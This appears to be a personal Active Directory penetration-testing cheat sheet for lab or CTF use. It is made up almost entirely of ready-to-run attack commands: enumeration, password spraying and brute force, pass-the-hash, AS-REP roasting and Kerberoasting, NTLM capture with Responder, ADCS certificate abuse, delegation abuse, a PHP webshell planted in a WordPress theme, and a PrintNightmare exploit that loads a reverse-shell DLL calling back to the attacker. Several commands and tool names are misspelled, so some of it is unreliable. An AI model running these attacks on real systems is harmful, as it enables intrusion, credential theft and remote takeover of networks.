#### AD Mindset

- SMB
- rpc
- ldapsesa
- AS-REQ anonymous (requires user list)

#### SMB

Check for live host:

```
nxc smb $CIDR
```

Anonymous listing:
```
smbclient -L //{ip}/
```
Anonymous logon:
```
smbclient //{ip}/{drive name}
```

AD user:
```
smbclient -L //ip/ -U {domain}/{user} --password=''
```

Download directory/mass download files:
```
prompt off
recurse on
mget *
```
#### RPC
Anonymous:
```
rpcclient -U "" -N {ip}
querydominfo
querydispinfo
enumdomusers
```
With a user:
```
rpcclient //{ip} -U domain/user%password
```

Change password if has permission:
```
rpcclient //{ip} -U domain/user%password
setuserinfo2 user2 23 'new password'
```
#### ldap
```
ldapsearch -H ldap://{ip} -x -s base
ldapsearch -H ldap://{ip} -x -s base namingcontexts

Check if anonymous binding allowed:
ldapsearch -H ldap://{ip} -x -b “dc=htb,dc=local”
```

#### Kerbrute

```
kerbrute userenum -d {domain} --dc {ip} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 100
kerbrute passwordspray -d {domain} --dc {ip} {username.txt} "password"
```


#### netexec

Password Policies:
```
netexec smb {ip} --pass-pol
```

Bruteforce:
```
netexec smb {ip} -u {username/list} -p '{password/list}' -d {domain}
```

With NTLM hash:
```
netexec smb {ip/ips} -u {username} -d {domain name} -H {hash}
```

Check LDAP signing:
```
netexec ldap {ip} -u user -p pass --kdcHost {dc_ip} -M ldap-checker
```

Check user descriptions:
```
netexec ldap {ip} -u user -p pass --kdc-host {dc_ip} -M -get-desc-users
```
#### evil-winrm
```
evil-WinRM -i {target_ip} -u {username} -p {password}
```

With hash:
```
evil-winrm -i {ip} -u {user} -H '{NT hash}'
```

#### Roasting
AS-REQ:
```
Anonymous:
impacket-GetNPUsers -request -dc-ip {dc ip} -usersfile users.txt {domain}/ -no-pass

impacket-GetNPUsers -dc-ip {dc ip} -request -outputfile hashes.asreproast {domain/user}

Windows:
.\Rebeus.exe asreproast /nowrap
```
**Hashcat grep mode for Kerberos AS-REP: 18200**
```
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rokcyou.txt --force
```

Kerberoasting:
```
impacket-GetUserSPNs -request -dc-ip {dc ip} -outputfile hashes.kerberoast {domain/user}

Windows:
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
**Hashcat grep mode Kerberos TGS-REQ: 13100**
```
hashcat -m 13100 hashes.asreproast /usr/share/wordlists/rokcyou.txt --force
```

To Sync time:
```
sudo ntpdate -u {target_ip} && impacket-GetUserSPNs...
```
#### Bloodhound
```
sudo neo4j start
bloodhound
```

Upload Data -> upload zip file

#### bloodhound-python
```
bloodhound-python -d domain -u user -p password -ns {dc-ip} -c all --zip
```

### NTLM Capture
```
sudo responder -I tun0
hashcat -m 5600
```


#### MSSQL
Login:
```
impacket-mssql user@ip -windows-auth
```

List of commands: `help`
NTLM capture:
```
sudo responder -I tun0
xp_dirtree \\{kali_ip}\whatever\hi
```


#### Certify

```
.\certify.exe find /vulnerable
Scenario 3:
.\certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:VulnTemplate /altname:administrator

Copy paste cert.pem into cert.pem on kali
run openssl command to export to cert.pfx
upload to target machine
Get ticket:
.\Rubeus.exe asktgt /user:administrator /certificate:C:\location\cert.pfx
Get NTLM:
.\Rubeus.exe asktgt /user:administrator /certificate:C:\location\cert.pfx /getcredentials /show /nowrap
```

On Kali:
```
certipy-ad find -u user -p password -target {CA_ip} -text -stdout -vulnerable
certipy-ad req -u user -p password -target {CA_ip} -upn administrator@{CA_ip} -ca {ca name} -template {template name}
certify auth -pfx cert.pfx
```
#### Wordpress

`wp-scan {url} --enumerate`

**Generate wordlist:**
`cewl {url} > custom_list.txt`

**Bruteforce wordpress login:**

```
hydra -l admin -P custom_list.txt -s {target port} {target ip} http-post-form
"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.192.106%2Fwp-admin%2F&testcookie=1:Invalid Username"

```

**Get shell:**
**Edit theme plugin:**

**Appearance -> Theme Editor -> Theme Functions**

**function webshell() {**

**echo shell_execute($_GET[‘cmd’]);**

**}**

**add_action(‘wp_head’, ‘webshell’);**

**Update File**

**Trigger: http://web/?cmd=whoami**


#### Tunneling
**Ligolo**

Proxy:
```
sudo ip tuntap add user kali mode tun ligolo

sudo ip link set ligolo up

./lin-proxy -selfcert -laddr 0.0.0.0:443
```

Transfer agent to target
```
.\lin-agent.exe -connect {kali_ip}:443 -ignore-cert 
```

On server:
```
session
ifconfig
```

On kali:
```
sudo ip route add {internal subnet ip} dev ligolo

**Ex: 10.10.209.0/24 make sure it’s 0/24 for all interfaces**
```

On server: `start`
**Add a listener: listener_add --addr 0.0.0.0:1235 --to**


#### Useful Kali Commands

To start a web server:
```
python3 -m http.server 80
```

Split file by white space:
```
cat file.txt | awk '{print $1, $4}' > temp.txt
```

SMB share w/ anonymous user:
```
sudo smbserver.py share ./
Remote: \\{ip}\share\file.txt
```

Transfer files from Windows to Kali:

```
impacket-smbserver temp . -smb2support -user hacker -password hack

WIndows:

net use \\{my_ip}\temp /user:hacker hack

copy {full_path_file} \\{my_ip}\temp
```

#### Create & Mount an ntfs disk
```
dd if=/dev/zero of=ntfs.disk bs=1024M count=2

```
#### Useful Powershell Commands

```
(Get-PSReadlineOption).HistorySavePath

*Check winpeas for Powershell Transcript Path*

Get-ChildItem -Path C:\ -Include *.{extension} -File -Recurse -ErrorAction SilentlyContinue
```


#### Kerberos Constrained Delegation

Enumerate:
```
Import-Module .\powerview.ps1
Get-DomainUser -TrustedToAuth -Properties distinguishedname, msds-allowedtodelegateto,samaccountname | fl
```

Exploit:
```
.\Rubeus.exe hash /user:test /password:pass123 /domain:pwn.local
(Copy rc4_hmac hash)
.\Rebeus.exe s4u /user:test /rc4:{hash} /impersonateuser:Administrator /domain:pwn.local /msdsspn:cifs/DC01.pwn.local /ptt
```

#### Nopac
Check if MachineAccountQuota > 0
```
netexec ldap 10.10.10.10 -u username -p 'Password123' -d 'domain.local' --kdcHost 10.10.10.10 -M MAQ
StandIn.exe --object ms-DS-MachineAccountQuota=*
```

Check if DC vulnerable:
```
netexec smb 10.10.10.10 -u '' -p '' -d domain -M nopac
```

##### PrintNightmare
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f dll > rev.dll
msfconsole
use exploit/multi/handler
SET LHOST {ip}
SET LPORT {port}
SET PAYLOAD windows/x64/shell_reverse_tcp
impacket-smbserver share `pwd` -smb2support
python3 CVE-2021-1675.py kkms/{user}:{password}@{domain_ip} '\\{kali_ip}/share/rev.dll'
```
